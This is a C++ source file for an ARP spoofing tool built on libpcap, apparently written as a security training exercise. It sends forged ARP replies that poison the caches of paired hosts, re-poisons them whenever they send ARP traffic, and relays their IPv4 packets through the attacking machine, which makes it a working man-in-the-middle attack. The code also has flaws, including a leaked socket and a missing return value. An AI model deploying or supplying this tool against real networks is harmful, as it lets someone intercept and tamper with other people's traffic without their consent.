#include "arpspoof.h"

ArpSpoof::ArpSpoof(char* device) : device_(device) {
    handle_ = pcap_open_live(device_, BUFSIZ, 1, 1000, errbuf_);

    Mac_f_ = (Mac*)malloc(sizeof(Mac));
    *Mac_f_ = Mac("ff:ff:ff:ff:ff:ff");
    Mac_0_ = (Mac*)malloc(sizeof(Mac));
    *Mac_0_ = Mac("00:00:00:00:00:00");

    my_MAC_ = ArpSpoof::get_my_MAC();
    my_ip_ = ArpSpoof::get_my_ip();

    std::cout << std::string(*my_ip_) << std::endl;
}

ArpSpoof::~ArpSpoof() {
    std::vector<Flow*>::iterator iter;

    for (iter = flow_list_.begin(); iter != flow_list_.end(); iter++) {
        free((*iter)->ip_);
        free((*iter)->mac_);
        free(*iter);
    }
    
    free(my_MAC_);
    free(my_ip_);
    printf("ENDENDNDNDND\n");
}

Mac* ArpSpoof::get_my_MAC() {
    // get MAC addr from /sys/class/net/inteface/address
    std::string device(device_);
    std::ifstream file("/sys/class/net/" + device + "/address");
    if (file.fail()) {
        fprintf(stderr, "ERROR : error opening file!!\n");
        return 0x00;
    }
    std::string MAC_addr;
    std::getline(file, MAC_addr);
    std::cout << "[+] My MAC address is " << MAC_addr << std::endl;
    // return MAC addr
    Mac* my_MAC = (Mac*)malloc(sizeof(Mac)); // learned from mentor gilgil
    *my_MAC = Mac(MAC_addr);
    return my_MAC; // free in callee needed
}

Ip* ArpSpoof::get_my_ip() {
    unsigned char temp[4] = {0, };
    Ip* my_ip = (Ip*)malloc(sizeof(Ip));
    uint32_t temp_num = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    ifreq ifrq;
    sockaddr_in* loopback;
    strcpy(ifrq.ifr_name, device_);
    ioctl(sock, SIOCGIFADDR, &ifrq);
    loopback = (sockaddr_in*)&ifrq.ifr_addr;
    memcpy(temp, (void*)&loopback->sin_addr, sizeof(loopback->sin_addr));

    //close(sock);
    for (int i = 0; i < 4; i++) {
        temp_num += (temp[i] << (8*i));
    }
    printf("%d\n", temp[3]);
    *my_ip = Ip(htonl(temp_num));
    return my_ip;
}

Mac* ArpSpoof::capture_packet(Ip* target_ip = NULL) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    u_char* new_packet;
    int res;

    EthHdr* ethhdr = (EthHdr*)malloc(sizeof(EthHdr));
    ArpHdr* arphdr = (ArpHdr*)malloc(sizeof(ArpHdr));
    Flow* res_flow;


    while(true) {
        res = pcap_next_ex(handle_, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle_));
            break;
        }
        
        if(target_ip == nullptr) {
            ethhdr = (EthHdr*)packet;
            res_flow = ArpSpoof::check_flow(&(ethhdr->smac_), MY_FLOW);
            if ((ethhdr->type() == EthHdr::Arp) && (res_flow != NULL)) {
                printf("[+]REINFECTED!!\n");
                ArpSpoof::arp_infect(res_flow);
            }

            if ((ethhdr->type() == EthHdr::Ip4) && (res_flow != NULL)) {
                new_packet = (u_char*)packet;
                ArpSpoof::relay_packet(res_flow, new_packet, header->len);
            }
        } else {
            EthArpHeader* etharp_packet = (EthArpHeader*)packet;
            if (etharp_packet->eth_.type() != 0x0806) continue;
            if (etharp_packet->arp_.sip_ != htonl(*target_ip)) continue;
            printf("[*] ARP Reply packet captured!!\n");

            Mac* target_MAC = (Mac*)malloc(sizeof(Mac));
            *target_MAC = etharp_packet->arp_.smac_;
            std::cout << "[+] Tatget\'s MAC address is " << std::string(*target_MAC) << std::endl;
            return target_MAC; // free from callee needed
        }
    }
}

void ArpSpoof::append_flows(char* input_ip) {
    Flow* flow = (Flow*)malloc(sizeof(Flow));
    flow->ip_ = (Ip*)malloc(sizeof(Ip));
    flow->mac_ = (Mac*)malloc(sizeof(Mac));
    *(flow->ip_) = Ip(input_ip);
    ArpSpoof::resolve_MAC(flow);
    flow_list_.push_back(flow);
}

Flow* ArpSpoof::check_flow(Mac* target_mac, int flow_enum) {
    std::vector<Flow*>::iterator iter;

    for (iter = flow_list_.begin(); iter != flow_list_.end(); iter++) {
        if (*((*iter)->mac_) == *target_mac) {
            if(flow_enum) { // PAIR_FLOW = 1
                return (*iter)->pair_flow_;
            }
            else {// MY_FLOW = 0
                return (*iter);
            }
        }
    }
    return NULL;
}

void ArpSpoof::connect_flows(){
    std::vector<Flow*>::iterator iter;
    int i = 1;

    for (iter = flow_list_.begin(); iter != flow_list_.end(); iter++) {
        if (i%2) {
            (*iter)->pair_flow_ = *(iter+1);
        }
        else {
            (*iter)->pair_flow_ = *(iter-1);
        }
        i++;
    }

    for (iter = flow_list_.begin(); iter != flow_list_.end(); iter++) {
        ArpSpoof::arp_infect(*iter);
    }
}

void ArpSpoof::resolve_MAC(Flow* flow) {
    send_arp_packet(Mac_f_, my_MAC_, ArpHdr::Request,
        my_MAC_, my_ip_, Mac_0_, flow->ip_);
    flow->mac_ = ArpSpoof::capture_packet(flow->ip_);
}

void ArpSpoof::arp_infect(Flow* flow) {
    send_arp_packet(flow->mac_, my_MAC_, ArpHdr::Reply, my_MAC_,
        flow->pair_flow_->ip_, flow->mac_, flow->ip_);
    printf("[+] Infected!!\n");
}

void ArpSpoof::send_arp_packet(Mac* eth_dmac, Mac* eth_smac, int arp_type,
    Mac* arp_smac, Ip* arp_sip, Mac* arp_tmac, Ip* arp_tip) {
    EthArpHeader* hdr = new EthArpHeader;
    hdr->eth_.dmac_ = *eth_dmac;
    hdr->eth_.smac_ = *eth_smac;
    hdr->eth_.type_ = htons(EthHdr::Arp);
    hdr->arp_.hrd_ = htons(ArpHdr::ETHER);
	hdr->arp_.pro_ = htons(EthHdr::Ip4);
    hdr->arp_.hln_ = Mac::SIZE;
	hdr->arp_.pln_ = Ip::SIZE;
    hdr->arp_.op_ = htons(arp_type);
    hdr->arp_.smac_ = *arp_smac;
    hdr->arp_.sip_ = htonl(*arp_sip);
    hdr->arp_.tmac_ = *arp_tmac;
    hdr->arp_.tip_ = htonl(*arp_tip);

    ArpSpoof::send_packet((u_char*)hdr, sizeof(EthArpHeader));
    delete(hdr);
    std::cout << "[*] Sent ARP Packet .." << std::endl;
}

void ArpSpoof::relay_packet(Flow* flow, u_char* packet, unsigned int size) {
    EthHdr* ethhdr = (EthHdr*)packet;
    IpHdr* iphdr = (IpHdr*)(packet + sizeof(EthHdr));

    if (size < 0) {
        printf("[*]FAILED RELAY, JUMBO!!\n");
    } else {
        ethhdr->dmac_ = *(flow->pair_flow_->mac_);
        ethhdr->smac_ = *my_MAC_;

        send_packet((u_char*)packet, size);
        printf("[+]RELAYED PACKET, size : %d\n", size);
    }
}

void ArpSpoof::send_packet(u_char* packet, int size) {
    int res = pcap_sendpacket(handle_, packet, size);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_));
    }
}